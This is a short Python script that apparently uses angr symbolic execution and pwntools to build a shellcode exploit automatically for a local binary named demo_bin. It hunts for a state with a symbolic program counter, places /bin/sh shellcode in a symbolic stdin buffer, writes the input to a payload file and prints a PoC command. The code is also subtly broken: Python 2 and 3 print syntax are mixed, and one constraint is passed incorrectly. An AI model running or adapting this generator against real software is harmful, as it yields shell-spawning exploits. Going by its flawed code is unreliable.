import sys
import angr
import subprocess
import logging
from angr import sim_options as so
from pwn import *
context.arch='i386'
shellcode=asm(shellcraft.sh())
def fully_symbolic(s,var):
	for x in range(s.arch.bits):
		if not s.solver.symbolic(var[x]):
			return 0
	return 1
def check_continuity(addr,addrs,l):
	for x in range(l):
		if addr+x not in addrs:
			return 0 
	return 1
def find_symbolic_buffer(s,l):
	stdin=s.posix.stdin
	sym_addrs=[]
	for _,symbol in s.solver.get_variables("file",stdin.ident):
		sym_addrs.extend(s.memory.addrs_for_name(next(iter(symbol.variables))))
	for addr in sym_addrs:
		if check_continuity(addr,sym_addrs,l):
			yield addr
def main():
	p=angr.Project("./demo_bin")
	extra={so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
	s=p.factory.entry_state(add_options=extra)
	sim=p.factory.simgr(s,save_unconstrained=True)
	exp=0
	while exp==0:
#		print sim
		sim.step()
		if len(sim.unconstrained)>0:
			for x in sim.unconstrained:
				if(fully_symbolic(x,x.regs.pc)):
					#print "GET IT!"
					exp= x
					break
		sim.drop(stash='unconstrained')
	print (exp.solver.symbolic(exp.regs.pc))
	
	for addr in find_symbolic_buffer(exp,len(shellcode)):
		mem		= exp.memory.load(addr,len(shellcode))
		payload = exp.solver.BVV(shellcode)
		if exp.satisfiable(extra_constraints=(mem==payload,exp.regs.pc==addr)):
			exp.add_constraints(mem=payload)
			exp.add_constraints(exp.regs.pc==addr)
			break
			#seak for a exploitable state
	print "PAYLOAD->./payload"
	fp=open("./payload","wb")
	fp.write(exp.posix.dumps(0))
	fp.close()
	print "Poc:\n(cat ./payload; cat -)| ./demo_bin"
	
if __name__ == "__main__":
	logging.getLogger("angr").setLevel("ERROR")
	main()

